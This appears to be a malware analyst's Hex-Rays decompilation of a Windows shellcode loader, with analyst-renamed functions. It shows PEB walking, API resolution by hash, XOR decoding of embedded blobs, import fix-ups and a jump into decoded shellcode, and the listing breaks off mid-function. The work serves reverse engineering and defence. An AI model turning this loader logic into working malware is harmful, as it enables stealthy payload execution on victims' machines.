/* This file was generated by the Hex-Rays decompiler version 9.1.0.250226.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <defs.h>

//-------------------------------------------------------------------------
// Function declarations

struct _LIST_ENTRY *start();
__int64 __fastcall fn_hash_131_4010F0(__int64, int);
void __fastcall fn_call_qmemcpy(void *, const void *, int);
__int16 __fastcall sub_401141(__int64, __int64);
__int64 __fastcall sub_401170(__int64);
__int64 __fastcall sub_4011A0(__int64, __int64, __int64);
_QWORD *__fastcall sub_4011F2(int _4_bytes_and_update_struct_fields, _QWORD *i, __int64 a3);                                                                                                                                        // idb
__int64 __fastcall fn_align_4096(signed int len);                                                                                                                                                                                   // idb
__int64 __fastcall fn_call_align_4096(char *, signed int *MW_DATAINFO);                                                                                                                                                             // idb
__int64 __fastcall sub_4012A3(int(__fastcall **a1_arr_NT_API)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **), MW_DATA_INFO *MW_DATAINFO, unsigned int *encDataInfo);                                                             // idb
__int64 __fastcall fn_resolve_api_by_hash_and_update(int(__fastcall **a1_arr_NT_API)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **), int byte_0x2, MW_DATA_INFO *MW_DATAINFO, int _4_bytes_and_update_struct_fields, _QWORD *i); // idb
void __fastcall sub_401434(MW_DATA_INFO *MW_DATAINFO, int _4_bytes_and_update_struct_fields, int a3, __int64 *i);                                                                                                                   // idb
void __fastcall fn_xor_decode(MW_BLOB32 *p_dataInfo2, MW_BLOB32 *p_xorKeyInfo);                                                                                                                                                     // idb
void *__fastcall fn_alloc_arr(__int64 a1_arr_NT_API, const void *, unsigned int n5);                                                                                                                                                // idb
void *__fastcall fn_main(int(__fastcall **api_info)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **), char *a2, unsigned int n5);
struct _LIST_ENTRY *__fastcall fn_get_dll_adrress(int n0x3729C0C); // idb
__int64 __fastcall fn_resolve_ntAPI_address(__int64, __int64, int);
void __fastcall fn_init_struct_object(unsigned int *encDataInfo, void *pData, unsigned int n5); // idb
__int64 __fastcall fn_return_argv1(unsigned int *encDataInfo);                                  // idb
__int64 __fastcall sub_4019D1(const void **encDataInfo, void *a2, int n2);
char __fastcall fn_get_1_bytes_and_update_struct_fields(unsigned int *encDataInfo); // idb
__int64 __fastcall fn_get_4_bytes_and_update_struct_fields(__int64);
__int64 __fastcall fn_updateDataPtrInObj(__int64, int);
__int64 __fastcall fn_get_data_ptr_n_update_struct_fields(__int64, _DWORD *);
__int64 __fastcall sub_401AE2(unsigned int *encDataInfo, int n11);                                                                // idb
__int64 __fastcall fn_call_NativeAPI(__int64 a1_arr_NT_API, __int64 a2, unsigned int n5, int n12288, int n4);                     // idb
_BOOL8 __fastcall fn_ntdll_NtFreeVirtualMemory(__int64 a1_arr_NT_API, __int64 pData, unsigned int a3);                            // idb
_BOOL8 __fastcall fn_call_ntdll_NtProtectVirtualMemory(__int64 a1_arr_NT_API, __int64 data_ptr_n_update_struct, unsigned int a3); // idb
char *fn_return_unknow_data();
__int64 __fastcall sub_401F31(__int64 a1, __int64 a2);
__int64 __fastcall sub_403C57(__int64);
__int64 __fastcall sub_403D46(__int64, int *);
__int64 __fastcall sub_403D8E(__int64 a1, _DWORD *a2);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN sub_401AF0;

//----- (0000000000401000) ----------------------------------------------------
struct _LIST_ENTRY *start()
{
  __int64 n10;                           // rcx
  MW_API_INFO *address_api_info;         // rdi
  __int64 *encDataInfo_1;                // rdi
  __int64 i;                             // rcx
  struct _LIST_ENTRY *ntdll.dll;         // rax
  char *pData;                           // rax
  char *v6;                              // rax
  int _4_bytes_and_update_struct_fields; // [rsp+2Ch] [rbp-5Ch]
  unsigned int encDataInfo[6];           // [rsp+30h] [rbp-58h] BYREF
  MW_API_INFO api_info;                  // [rsp+48h] [rbp-40h] BYREF

  n10 = 10;
  address_api_info = &api_info;
  while (n10)
  {
    LODWORD(address_api_info->LdrLoadDll) = 0;
    address_api_info = (MW_API_INFO *)((char *)address_api_info + 4);
    --n10;
  }
  encDataInfo_1 = (__int64 *)encDataInfo;
  for (i = 6; i; --i)
  {
    *(_DWORD *)encDataInfo_1 = 0;
    encDataInfo_1 = (__int64 *)((char *)encDataInfo_1 + 4);
  }
  ntdll.dll = fn_get_dll_adrress(0x3729C0C);
  api_info.ntdllBaseAddr = (__int64)ntdll.dll;
  if (ntdll.dll)
  {
    api_info.LdrLoadDll = fn_resolve_ntAPI_address(0, (__int64)ntdll.dll, 0x52841068);
    api_info.NtAllocateVirtualMemory = fn_resolve_ntAPI_address(0, api_info.ntdllBaseAddr, 0xDF59DF5D);
    api_info.NtProtectVirtualMemory = fn_resolve_ntAPI_address(0, api_info.ntdllBaseAddr, 0x3D52223);
    api_info.NtFreeVirtualMemory = fn_resolve_ntAPI_address(0, api_info.ntdllBaseAddr, 0x35F50C56);
    pData = fn_return_unknow_data();
    fn_init_struct_object(encDataInfo, pData, 5u);
    _4_bytes_and_update_struct_fields = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
    v6 = (char *)fn_updateDataPtrInObj((__int64)encDataInfo, _4_bytes_and_update_struct_fields != 0);
    return (struct _LIST_ENTRY *)fn_main(&api_info, v6, _4_bytes_and_update_struct_fields);
  }
  return ntdll.dll;
}

//----- (00000000004010F0) ----------------------------------------------------
__int64 __fastcall sub_4010F0(__int64 a1, int a2)
{
  __int64 v2;     // r9
  __int64 result; // rax
  char v4;        // r8

  v2 = 0;
  result = 0;
  while (!a2)
  {
    if (!*(_BYTE *)(a1 + v2))
      return result;
  LABEL_7:
    v4 = *(_BYTE *)(a1 + v2);
    if (v4)
    {
      if (v4 <= 0x60)
        v4 += 32;
      result = (unsigned int)(unsigned __int8)v4 + 131 * (_DWORD)result;
    }
    ++v2;
  }
  if (a2 <= 0 || a2 != (_DWORD)v2)
    goto LABEL_7;
  return result;
}

//----- (000000000040112E) ----------------------------------------------------
void __fastcall fn_call_wrapper(void *a1, const void *a2, int a3)
{
  qmemcpy(a1, a2, a3);
}

//----- (0000000000401141) ----------------------------------------------------
__int16 __fastcall sub_401141(__int64 a1, __int64 a2)
{
  __int64 i;      // r8
  __int16 result; // ax

  for (i = 0;; ++i)
  {
    result = *(char *)(a2 + i);
    if (!(_BYTE)result)
      break;
    *(_WORD *)(a1 + 2 * i) = result;
  }
  return result;
}

//----- (0000000000401170) ----------------------------------------------------
__int64 __fastcall sub_401170(__int64 a1)
{
  __int64 v1;     // rdx
  __int64 result; // rax

  v1 = 0;
  do
    result = (unsigned int)v1++;
  while (*(_BYTE *)(a1 + v1 - 1));
  return result;
}

//----- (00000000004011A0) ----------------------------------------------------
__int64 __fastcall sub_4011A0(__int64 a1, __int64 a2, __int64 a3)
{
  int v3;         // r9d
  __int64 result; // rax

  v3 = *(unsigned __int8 *)(a1 + 2);
  if ((unsigned __int8)(v3 - 4) > 5u)
  {
    result = 0;
    if ((_BYTE)v3 != 1)
      return result;
    *(_QWORD *)(a2 + *(unsigned int *)(a1 + 3)) = a3 + *(unsigned int *)(a1 + 7) + (unsigned __int64)*(unsigned int *)(a2 + *(unsigned int *)(a1 + 3));
  }
  else
  {
    *(_DWORD *)(a2 + *(unsigned int *)(a1 + 3)) = a3 + *(_DWORD *)(a1 + 7) + *(_DWORD *)(a2 + *(unsigned int *)(a1 + 3)) - (a2 + *(_DWORD *)(a1 + 3) + v3);
  }
  return 1;
}

//----- (00000000004011F2) ----------------------------------------------------
_QWORD *__fastcall sub_4011F2(int _4_bytes_and_update_struct_fields, _QWORD *i, __int64 a3)
{
  _QWORD *i_3; // rax
  _QWORD *i_2; // r9
  _QWORD *i_1; // rcx

  i_3 = 0;
  if (a3)
  {
    i_2 = &i[_4_bytes_and_update_struct_fields];
    i_1 = i;
    while (i_1 != i_2)
    {
      i_3 = i_1++;
      if (*(i_1 - 1) == a3)
        return i_3;
    }
    while (i != i_1)
    {
      i_3 = i;
      if (*i++ == 0)
      {
        *i_3 = a3;
        return i_3;
      }
    }
    return 0;
  }
  return i_3;
}

//----- (000000000040122F) ----------------------------------------------------
__int64 __fastcall fn_align_4096(signed int len)
{
  if (len % 4096 > 0)
    len += 4096 - len % 4096;
  return (unsigned int)len;
}

//----- (0000000000401248) ----------------------------------------------------
__int64 __fastcall fn_call_align_4096(char *a1, signed int *MW_DATAINFO)
{
  __int64 i;      // rsi
  const void *v5; // rdx
  __int64 result; // rax

  for (i = 0; i != 4; ++i)
  {
    v5 = *(const void **)&MW_DATAINFO[4 * i + 2];
    if (v5)
      fn_call_qmemcpy(a1, v5, MW_DATAINFO[4 * i]);
    *(_QWORD *)&MW_DATAINFO[4 * i + 2] = a1;
    if (i)
      result = MW_DATAINFO[4 * i];
    else
      result = (int)fn_align_4096(*MW_DATAINFO);
    a1 += result;
  }
  return result;
}

//----- (00000000004012A3) ----------------------------------------------------
__int64 __fastcall sub_4012A3(
    int(__fastcall **a1_arr_NT_API)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **),
    MW_DATA_INFO *MW_DATAINFO,
    unsigned int *encDataInfo)
{
  __int64 n65;                           // rcx
  char *pData;                           // rsi
  _DWORD *v7;                            // rdi
  int _4_bytes_and_update_struct_fields; // eax
  void *pData_1;                         // rbx
  char *v10;                             // rsi
  int v11;                               // r12d
  struct _LIST_ENTRY *v12;               // rdx
  __int64 result;                        // rax
  _BYTE v14[300];                        // [rsp+2Ch] [rbp-12Ch] BYREF

  n65 = 65;
  pData = (char *)MW_DATAINFO->moduleInfo.pData;
  v7 = v14;
  while (n65)
  {
    *v7++ = 0;
    --n65;
  }
  _4_bytes_and_update_struct_fields = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
  pData_1 = MW_DATAINFO->apiHashesInfo.pData;
  v10 = &pData[_4_bytes_and_update_struct_fields];
  v11 = *(_DWORD *)((char *)pData_1 + (int)fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo));
  LODWORD(pData_1) = sub_401170((__int64)v10);
  fn_call_qmemcpy(v14, v10, (int)pData_1);
  v14[(unsigned int)pData_1] = 46;
  v14[(_DWORD)pData_1 + 1] = 100;
  v14[(_DWORD)pData_1 + 2] = 108;
  v14[(_DWORD)pData_1 + 3] = 108;
  v12 = sub_401AF0(a1_arr_NT_API, (__int64)v14);
  result = 0;
  if (v12)
    return fn_resolve_ntAPI_address((__int64)a1_arr_NT_API, (__int64)v12, v11);
  return result;
}

//----- (0000000000401361) ----------------------------------------------------
__int64 __fastcall fn_resolve_api_by_hash_and_update(
    int(__fastcall **a1_arr_NT_API)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **),
    int byte_0x2,
    MW_DATA_INFO *MW_DATAINFO,
    int _4_bytes_and_update_struct_fields,
    _QWORD *i)
{
  __int64 n6;                   // rcx
  void *pData;                  // rdx
  uint32_t len;                 // r8d
  unsigned int *encDataInfo_1;  // rdi
  __int64 v13;                  // rax
  unsigned __int8 *v14;         // r13
  __int64 n3;                   // rax
  __int64 v16;                  // r8
  __int64 v17;                  // rdx
  __int64 v19;                  // rax
  _QWORD *v20;                  // rax
  unsigned int encDataInfo[20]; // [rsp+28h] [rbp-50h] BYREF

  n6 = 6;
  pData = MW_DATAINFO->fixingCodeTable.pData;
  len = MW_DATAINFO->fixingCodeTable.len;
  encDataInfo_1 = encDataInfo;
  while (n6)
  {
    *encDataInfo_1++ = 0;
    --n6;
  }
  fn_init_struct_object(encDataInfo, pData, len);
  while (1)
  {
    v13 = sub_401AE2(encDataInfo, 11);
    v14 = (unsigned __int8 *)v13;
    if (!v13)
      return 1;
    n3 = *(unsigned __int8 *)(v13 + 1);
    if ((unsigned __int8)n3 <= 3u)
    {
      v16 = *((_QWORD *)&MW_DATAINFO->shellcode.pData + 2 * n3);
      v17 = *((_QWORD *)&MW_DATAINFO->shellcode.pData + 2 * *v14);
      goto LABEL_8;
    }
    if ((_BYTE)n3 == 4)
    {
      v19 = sub_4012A3(a1_arr_NT_API, MW_DATAINFO, encDataInfo);
      v20 = sub_4011F2(_4_bytes_and_update_struct_fields, i, v19);
      v16 = (__int64)v20;
      if (byte_0x2 == 4 && !v20)
        return 0;
      v17 = *((_QWORD *)&MW_DATAINFO->shellcode.pData + 2 * *v14);
    LABEL_8:
      if (!(unsigned int)sub_4011A0((__int64)v14, v17, v16))
        return 0;
    }
  }
}

//----- (0000000000401434) ----------------------------------------------------
void __fastcall sub_401434(MW_DATA_INFO *MW_DATAINFO, int _4_bytes_and_update_struct_fields, int a3, __int64 *i)
{
  __int64 *j_1;                                // rbp
  __int64 _4_bytes_and_update_struct_fields_1; // rsi
  __int64 *j;                                  // rbx
  __int64 v8;                                  // rax

  if (_4_bytes_and_update_struct_fields != -1)
  {
    j_1 = &i[a3];
    _4_bytes_and_update_struct_fields_1 = _4_bytes_and_update_struct_fields;
    for (j = i; j != j_1; ++j)
    {
      v8 = ((__int64(__fastcall *)(__int64))((char *)MW_DATAINFO->shellcode.pData + _4_bytes_and_update_struct_fields_1))(*j);
      if (v8)
        *j = v8;
    }
  }
}

//----- (000000000040147A) ----------------------------------------------------
void __fastcall fn_xor_decode(MW_BLOB32 *p_dataInfo2, MW_BLOB32 *p_xorKeyInfo)
{
  __int64 len; // r8
  int len_1;   // eax
  _BYTE *v4;   // r10

  len = 0;
  if (p_xorKeyInfo->len)
  {
    while (1)
    {
      len_1 = len;
      if ((signed int)p_dataInfo2->len <= (int)len)
        break;
      v4 = (char *)p_dataInfo2->pData + len++;
      *v4 ^= *((_BYTE *)p_xorKeyInfo->pData + len_1 % (signed int)p_xorKeyInfo->len);
    }
  }
}

//----- (00000000004014AC) ----------------------------------------------------
void *__fastcall fn_alloc_arr(__int64 a1_arr_NT_API, const void *a2, unsigned int n5)
{
  void *result; // rax
  void *v6;     // [rsp+38h] [rbp-20h]

  result = (void *)fn_call_NativeAPI(a1_arr_NT_API, 0, n5, 0x3000, 4);
  if (result)
  {
    v6 = result;
    fn_call_qmemcpy(result, a2, n5);
    return v6;
  }
  return result;
}

//----- (00000000004014F1) ----------------------------------------------------
void *__fastcall fn_main(
    int(__fastcall **api_info)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **),
    char *a2,
    unsigned int n5)
{
  __int64 n6;                               // rcx
  unsigned int *encDataInfo_1;              // rdi
  MW_DATA_INFO *address_data_info;          // rdi
  __int64 i;                                // rcx
  void *pData_1;                            // rax
  __int64 pData_2;                          // r13
  int num_0x22;                             // edi
  int get_4_bytes_and_update_struct_fields; // eax
  int v12;                                  // r14d
  char *v13;                                // r15
  int v14;                                  // eax
  __int64 *resolved_API_Array;              // r14
  unsigned int v16;                         // eax
  unsigned int finalPayloadSize_0xBA5F;     // edi
  __int64 finalPayloadAddr_0x3753;          // rax
  unsigned __int8 byte_0x2;                 // [rsp+3Fh] [rbp-E9h]
  int num_0xFFFFFFFF_1;                     // [rsp+40h] [rbp-E8h]
  unsigned int scOffset_0x3AB;              // [rsp+44h] [rbp-E4h]
  __int64 pData;                            // [rsp+48h] [rbp-E0h]
  unsigned int encDataInfo[6];              // [rsp+58h] [rbp-D0h] BYREF
  MW_DATA_INFO dataInfo;                    // [rsp+70h] [rbp-B8h] BYREF

  n6 = 6;
  encDataInfo_1 = encDataInfo;
  while (n6)
  {
    *encDataInfo_1++ = 0;
    --n6;
  }
  address_data_info = &dataInfo;
  for (i = 32; i; --i)
  {
    address_data_info->shellcode.len = 0;
    address_data_info = (MW_DATA_INFO *)((char *)address_data_info + 4);
  }
  pData_1 = fn_alloc_arr((__int64)api_info, a2, n5);
  if (pData_1)
  {
    pData_2 = (__int64)pData_1;
    fn_init_struct_object(encDataInfo, pData_1, n5);
    byte_0x2 = fn_get_1_bytes_and_update_struct_fields(encDataInfo);
    num_0x22 = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
    scOffset_0x3AB = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
    get_4_bytes_and_update_struct_fields = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
    dataInfo.field_38 = 0;
    num_0xFFFFFFFF_1 = get_4_bytes_and_update_struct_fields;
    dataInfo.num_0xE0 = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
    dataInfo.shellcode.pData = (void *)fn_get_data_ptr_n_update_struct_fields((__int64)encDataInfo, &dataInfo);
    dataInfo.dataInfo1.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.dataInfo1.len);
    dataInfo.dataInfo2.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.dataInfo2.len);
    dataInfo.fixingCodeTable.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.fixingCodeTable.len);
    dataInfo.moduleInfo.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.moduleInfo.len);
    dataInfo.apiHashesInfo.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.apiHashesInfo.len);
    dataInfo.xorKeyInfo.pData = (void *)fn_get_data_ptr_n_update_struct_fields(
        (__int64)encDataInfo,
        &dataInfo.xorKeyInfo.len);
    v12 = fn_align_4096(dataInfo.shellcode.len) + dataInfo.num_0xE0 + dataInfo.dataInfo1.len + dataInfo.dataInfo2.len;
    pData_1 = (void *)fn_call_NativeAPI((__int64)api_info, 0, v12 + 8 * num_0x22, 12288, 4);
    pData = (__int64)pData_1;
    if (pData_1)
    {
      fn_init_struct_object(encDataInfo, pData_1, v12 + 8 * num_0x22);
      v13 = (char *)fn_updateDataPtrInObj((__int64)encDataInfo, v12);
      v14 = fn_return_argv1(encDataInfo);
      resolved_API_Array = (__int64 *)fn_updateDataPtrInObj((__int64)encDataInfo, v14);
      fn_call_align_4096(v13, (signed int *)&dataInfo);
      fn_xor_decode(&dataInfo.dataInfo2, &dataInfo.xorKeyInfo);
      fn_xor_decode(&dataInfo.moduleInfo, &dataInfo.xorKeyInfo);
      pData_1 = (void *)fn_resolve_api_by_hash_and_update(api_info, byte_0x2, &dataInfo, num_0x22, resolved_API_Array);
      if ((_DWORD)pData_1)
      {
        v16 = fn_align_4096(dataInfo.shellcode.len);
        pData_1 = (void *)fn_call_ntdll_NtProtectVirtualMemory(
            (__int64)api_info,
            (__int64)dataInfo.shellcode.pData,
            v16);
        if ((_DWORD)pData_1)
        {
          fn_ntdll_NtFreeVirtualMemory((__int64)api_info, pData_2, 0);
          sub_401434(&dataInfo, num_0xFFFFFFFF_1, num_0x22, resolved_API_Array);
          fn_init_struct_object(encDataInfo, &a2[n5], 5u);
          finalPayloadSize_0xBA5F = fn_get_4_bytes_and_update_struct_fields((__int64)encDataInfo);
          finalPayloadAddr_0x3753 = fn_updateDataPtrInObj((__int64)encDataInfo, finalPayloadSize_0xBA5F != 0);
          ((void(__fastcall *)(__int64, _QWORD, MW_DATA_INFO *))((char *)dataInfo.shellcode.pData + scOffset_0x3AB))(
              finalPayloadAddr_0x3753,
              finalPayloadSize_0xBA5F,
              &dataInfo);
          return (void *)fn_ntdll_NtFreeVirtualMemory((__int64)api_info, pData, 0);
        }
      }
    }
  }
  return pData_1;
}

//----- (00000000004017E0) ----------------------------------------------------
_BYTE *__fastcall sub_4017E0(_BYTE *a1)
{
  _BYTE *result; // rax

  for (result = a1; *result && *result != 46; ++result)
    ;
  return result;
}

//----- (00000000004017F4) ----------------------------------------------------
struct _LIST_ENTRY *__fastcall fn_get_dll_adrress(int n0x3729C0C)
{
  struct _PEB_LDR_DATA *Ldr;                     // rax
  struct _LIST_ENTRY *p_InLoadOrderModuleList_1; // rbx
  struct _LIST_ENTRY *p_InLoadOrderModuleList;   // rsi
  struct _LIST_ENTRY *Flink_1;                   // rbp

  Ldr = NtCurrentPeb()->Ldr;
  p_InLoadOrderModuleList_1 = Ldr->InLoadOrderModuleList.Flink;
  p_InLoadOrderModuleList = &Ldr->InLoadOrderModuleList;
  while (p_InLoadOrderModuleList_1 != p_InLoadOrderModuleList)
  {
    Flink_1 = p_InLoadOrderModuleList_1->Flink;
    if ((unsigned int)fn_hash_131_4010F0(
            (__int64)p_InLoadOrderModuleList_1[6].Flink,
            LOWORD(p_InLoadOrderModuleList_1[5].Blink)) == n0x3729C0C)
      return p_InLoadOrderModuleList_1[3].Flink;
    p_InLoadOrderModuleList_1 = Flink_1;
  }
  return 0;
}

//----- (0000000000401842) ----------------------------------------------------
__int64 __fastcall fn_resolve_NT_API(__int64 a1, __int64 a2, int a3)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  if (!a2 || !a3)
    return 0;
  v3 = 0;
  v6 = a2 + *(int *)(a2 + 60);
  v7 = (_DWORD *)(a2 + *(unsigned int *)(v6 + 136));
  v8 = (unsigned int)v7[8];
  v23 = *(_DWORD *)(v6 + 140);
  v9 = (unsigned int)v7[7];
  v10 = (unsigned int)v7[9];
  while (1)
  {
    if (v7[6] <= v3)
      return 0;
    if ((unsigned int)fn_hash_131_4010F0(a2 + *(unsigned int *)(a2 + 4LL * v3 + v8), 0) == a3)
      break;
    ++v3;
  }
  v11 = a2 + *(unsigned int *)(a2 + 4LL * *(unsigned __int16 *)(a2 + 2LL * v3 + v10) + v9);
  if ((unsigned __int64)v7 < v11 && v11 < (unsigned __int64)v7 + v23 + a2)
  {
    v12 = v25;
    for (i = 65; i; --i)
      *v12++ = 0;
    v14 = v26;
    for (j = 65; j; --j)
      *v14++ = 0;
    v16 = sub_4017E0(v11);
    if (!v16)
      return 0;
    v18 = (const void *)(v16 + 1);
    fn_call_qmemcpy(v25, v17, v16 - (_DWORD)v17);
    v19 = sub_401170(v18);
    fn_call_qmemcpy(v26, v18, v19);
    v20 = sub_401AF0(a1, v25);
    if (!v20)
      return 0;
    v21 = fn_hash_131_4010F0((__int64)v26, 0);
    return fn_resolve_ntAPI_address(a1, v20, v21);
  }
  return v11;
}
// 401944: variable 'v17' is possibly undefined
// 401170: using guessed type __int64 __fastcall sub_401170(_QWORD);
// 4017E0: using guessed type __int64 __fastcall sub_4017E0(_QWORD);
// 401AF0: using guessed type __int64 __fastcall sub_401AF0(_QWORD, _QWORD);

//----- (00000000004019B0) ----------------------------------------------------
void __fastcall fn_init_struct_object(unsigned int *encDataInfo, void *pData, unsigned int n5)
{
  *((_QWORD *)encDataInfo + 2) = pData;
  encDataInfo[1] = n5;
  *encDataInfo = n5;
  *((_QWORD *)encDataInfo + 1) = pData;
}

//----- (00000000004019C0) ----------------------------------------------------
__int64 __fastcall sub_4019C0(__int64 a1)
{
  __int64 result; // rax

  *(_DWORD *)a1 = *(_DWORD *)(a1 + 4);
  result = *(_QWORD *)(a1 + 16);
  *(_QWORD *)(a1 + 8) = result;
  return result;
}

//----- (00000000004019CE) ----------------------------------------------------
__int64 __fastcall fn_return_argv1(unsigned int *encDataInfo)
{
  return *encDataInfo;
}

//----- (00000000004019D1) ----------------------------------------------------
__int64 __fastcall sub_4019D1(const void **encDataInfo, void *a2, int n2)
{
  __int64 n2_1;   // rsi
  __int64 result; // rax

  if (*(_DWORD *)encDataInfo < n2)
    return 0;
  n2_1 = n2;
  fn_call_qmemcpy(a2, encDataInfo[1], n2);
  result = 1;
  *(_DWORD *)encDataInfo -= n2_1;
  encDataInfo[1] = (char *)encDataInfo[1] + n2_1;
  return result;
}

//----- (0000000000401A06) ----------------------------------------------------
char __fastcall fn_get_1_bytes_and_update_struct_fields(unsigned int *encDataInfo)
{
  __int64 v2; // [rsp+2Fh] [rbp-9h] BYREF

  LOBYTE(v2) = 0;
  sub_4019D1((__int64)encDataInfo, &v2, 1);
  return v2;
}

//----- (0000000000401A28) ----------------------------------------------------
__int16 __fastcall sub_401A28(__int64 a1)
{
  __int64 v2; // [rsp+2Eh] [rbp-Ah] BYREF

  LOWORD(v2) = 0;
  sub_4019D1(a1, &v2, 2);
  return v2;
}

//----- (0000000000401A4D) ----------------------------------------------------
__int64 __fastcall fn_reader_u32(__int64 a1)
{
  _DWORD v2[3]; // [rsp+2Ch] [rbp-Ch] BYREF

  v2[0] = 0;
  sub_4019D1(a1, v2, 4);
  return v2[0];
}
// 4019D1: using guessed type __int64 __fastcall sub_4019D1(_QWORD, _QWORD, _QWORD);

//----- (0000000000401A72) ----------------------------------------------------
_BOOL8 __fastcall sub_401A72(__int64 a1)
{
  return (unsigned int)fn_get_4_bytes_and_update_struct_fields(a1) != 0;
}

//----- (0000000000401A88) ----------------------------------------------------
__int64 __fastcall fn_reader(__int64 a1, int a2)
{
  __int64 result; // rax

  result = 0;
  if (*(_DWORD *)a1 >= a2)
  {
    result = *(_QWORD *)(a1 + 8);
    *(_DWORD *)a1 -= a2;
    *(_QWORD *)(a1 + 8) = result + a2;
  }
  return result;
}

//----- (0000000000401AA7) ----------------------------------------------------
__int64 __fastcall fn_reader_blob32(__int64 a1, _DWORD *a2)
{
  int v4;         // eax
  __int64 result; // rax
  int v6;         // r9d

  v4 = fn_get_4_bytes_and_update_struct_fields(a1);
  result = fn_updateDataPtrInObj(a1, v4);
  if (!v6 || !result)
    return 0;
  if (a2)
    *a2 = v6;
  return result;
}
// 401AC8: variable 'v6' is possibly undefined

//----- (0000000000401AF0) ----------------------------------------------------
struct _LIST_ENTRY *__fastcall sub_401AF0(
    int(__fastcall **a1)(_QWORD, _QWORD, __int64 *, struct _LIST_ENTRY **),
    __int64 a2)
{
  __int64 n130;                      // rcx
  _DWORD *v5;                        // rdi
  __int16 v6;                        // bx
  int n0x3729C0C;                    // eax
  struct _LIST_ENTRY *dll_adrress;   // rsi
  struct _LIST_ENTRY *dll_adrress_1; // [rsp+20h] [rbp-248h] BYREF
  __int64 v11;                       // [rsp+28h] [rbp-240h] BYREF
  _BYTE *v12;                        // [rsp+30h] [rbp-238h]
  _BYTE v13[560];                    // [rsp+38h] [rbp-230h] BYREF

  n130 = 130;
  v11 = 0;
  v5 = v13;
  while (n130)
  {
    *v5++ = 0;
    --n130;
  }
  v12 = 0;
  v6 = sub_401170(a2);
  n0x3729C0C = fn_hash_131_4010F0(a2, 0);
  dll_adrress = fn_get_dll_adrress(n0x3729C0C);
  dll_adrress_1 = dll_adrress;
  if (!dll_adrress)
  {
    sub_401141((__int64)v13, a2);
    LOWORD(v11) = 2 * v6;
    v12 = v13;
    WORD1(v11) = 2 * v6 + 2;
    if ((*a1)(0, 0, &v11, &dll_adrress_1) >= 0)
      return dll_adrress_1;
  }
  return dll_adrress;
}

//----- (0000000000401BA5) ----------------------------------------------------
__int64 __fastcall fn_call_NativeAPI(__int64 a1_arr_NT_API, __int64 a2, unsigned int n5, int n12288, int n4)
{
  int v5;       // eax
  __int64 v6;   // rdx
  __int64 v8;   // [rsp+30h] [rbp-18h] BYREF
  __int64 n5_1; // [rsp+38h] [rbp-10h] BYREF

  n5_1 = n5;
  v8 = a2;
  v5 = (*(__int64(__fastcall **)(__int64, __int64 *, _QWORD, __int64 *, int, int))(a1_arr_NT_API + 8))(
      -1,
      &v8,
      0,
      &n5_1,
      n12288,
      n4);
  v6 = 0;
  if (v5 >= 0)
    return v8;
  return v6;
}

//----- (0000000000401BED) ----------------------------------------------------
_BOOL8 __fastcall fn_ntdll_NtFreeVirtualMemory(__int64 a1_arr_NT_API, __int64 pData, unsigned int a3)
{
  __int64 pData_1; // [rsp+20h] [rbp-18h] BYREF
  __int64 v5;      // [rsp+28h] [rbp-10h] BYREF

  pData_1 = pData;
  v5 = a3;
  return (*(int(__fastcall **)(__int64, __int64 *, __int64 *))(a1_arr_NT_API + 24))(-1, &pData_1, &v5) >= 0;
}

//----- (0000000000401C1C) ----------------------------------------------------
_BOOL8 __fastcall fn_call_ntdll_NtProtectVirtualMemory(
    __int64 a1_arr_NT_API,
    __int64 data_ptr_n_update_struct,
    unsigned int a3)
{
  __int64 data_ptr_n_update_struct_1; // [rsp+30h] [rbp-18h] BYREF
  __int64 v5;                         // [rsp+38h] [rbp-10h] BYREF

  v5 = a3;
  data_ptr_n_update_struct_1 = data_ptr_n_update_struct;
  return (*(int(__fastcall **)(__int64, __int64 *, __int64 *))(a1_arr_NT_API + 16))(
             -1,
             &data_ptr_n_update_struct_1,
             &v5) >= 0;
}

//----- (0000000000401C60) ----------------------------------------------------
char *fn_return_unknow_data()
{
  return byte_401C6D;
}

//----- (0000000000401C86) ----------------------------------------------------
__int64 __fastcall sub_401C86(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)
{
  __int64 v5; // [rsp+0h] [rbp-10h]

  if (!a1)
    return 0;
  v5 = a1 + *(int *)(a1 + 60);
  if (a2)
    *a2 = a1;
  if (a3)
    *a3 = v5;
  if (a4)
    *a4 = v5 + *(unsigned __int16 *)(v5 + 20) + 24;
  return 1;
}

//----- (0000000000401D2E) ----------------------------------------------------
_BOOL8 __fastcall sub_401D2E(__int64 a1)
{
  _DWORD *v2; // [rsp+20h] [rbp-10h] BYREF
  _WORD *v3;  // [rsp+28h] [rbp-8h] BYREF

  v3 = 0;
  v2 = 0;
  if (!(unsigned int)sub_401C86(a1, &v3, &v2, 0))
    return 0;
  return *v3 == 23117 && *v2 == 17744;
}

//----- (0000000000401F31) ----------------------------------------------------
__int64 __fastcall sub_401F31(__int64 a1, __int64 a2)
{
  __int64 i_1; // rax
  int i;       // [rsp+Ch] [rbp-4h]

  i_1 = *(unsigned int *)(a2 + 8);
  if ((_DWORD)i_1)
  {
    for (i = 0;; ++i)
    {
      i_1 = *(unsigned int *)(a1 + 8);
      if (i >= (int)i_1)
        break;
